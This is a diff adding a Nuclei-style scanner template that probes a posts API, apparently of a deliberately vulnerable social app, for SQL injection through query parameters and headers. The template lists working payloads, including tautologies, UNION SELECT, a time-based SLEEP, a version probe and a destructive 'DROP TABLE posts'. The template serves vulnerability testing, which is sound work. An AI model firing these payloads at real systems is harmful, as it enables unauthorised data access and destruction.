@@ -1,0 +1,99 @@
+id: vuln-sns-posts-public-sql-injection
+info:
+  name: Vuln SNS Posts Public - SQL Injection
+  author: claude
+  severity: high
+  description: |
+    Tests for SQL injection vulnerabilities in the public posts endpoint.
+    Although this endpoint doesn't accept visible parameters, it may process
+    hidden parameters that could be vulnerable to SQL injection.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: vuln-sns,sqli,posts,public
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/posts?{{param}}={{payload}}"
+
+    payloads:
+      param:
+        - "id"
+        - "user_id"
+        - "limit"
+        - "offset"
+        - "order"
+        - "sort"
+        - "filter"
+        - "search"
+        - "debug"
+
+      payload:
+        - "1' OR '1'='1"
+        - "1' OR '1'='1' --"
+        - "1' OR '1'='1' #"
+        - "1' UNION SELECT null,null,null --"
+        - "1' AND SLEEP(5) --"
+        - "1; DROP TABLE posts; --"
+        - "-1 OR 1=1"
+        - "1' ORDER BY 10 --"
+        - "1' AND 1=2 UNION SELECT @@version --"
+
+    attack: pitchfork
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+          - "syntax error"
+          - "MySQLSyntaxErrorException"
+        condition: or
+        part: body
+
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
+
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        words:
+          - "@@version"
+          - "information_schema"
+        condition: or
+        part: body
+
+    extractors:
+      - type: regex
+        name: sql_error
+        regex:
+          - 'SQL.*error.*'
+          - 'mysql.*error.*'
+        part: body
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/posts"
+
+    headers:
+      X-Debug: "{{payload}}"
+      X-User-Id: "{{payload}}"
+      X-Filter: "{{payload}}"
+
+    payloads:
+      payload:
+        - "' OR '1'='1"
+        - "1' UNION SELECT null --"
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+        condition: or
+        part: body
